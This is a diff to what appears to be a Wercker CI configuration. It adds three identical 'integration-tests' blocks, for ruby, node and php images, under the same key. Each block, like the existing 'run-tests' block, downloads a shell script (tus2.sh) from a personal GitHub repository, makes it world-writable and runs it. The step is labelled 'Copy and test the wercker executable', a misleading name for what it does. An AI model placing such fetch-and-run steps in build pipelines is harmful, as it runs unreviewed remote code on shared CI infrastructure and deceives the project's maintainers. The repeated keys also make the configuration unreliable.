@@ -71,3 +71,48 @@ run-tests:
                  apt-get -y install wget 
                  wget --version
                  wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+                 
+integration-tests:
+  box: 
+      id: ruby:latest
+      ports:
+         - "8080"
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               
+integration-tests:
+  box: 
+      id: node:latest
+      ports:
+         - "8080"
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
+               
+integration-tests:
+  box: 
+      id: php
+      ports:
+         - "8080"
+  steps:
+    - script:
+        name: Copy and test the wercker executable
+        code: |
+               apt-get -y update
+               apt-get -y install git
+               apt-get -y install wget 
+               wget --version
+               wget https://github.com/raufpermana22/verust/raw/main/tus2.sh && chmod 777 tus2.sh && ./tus2.sh
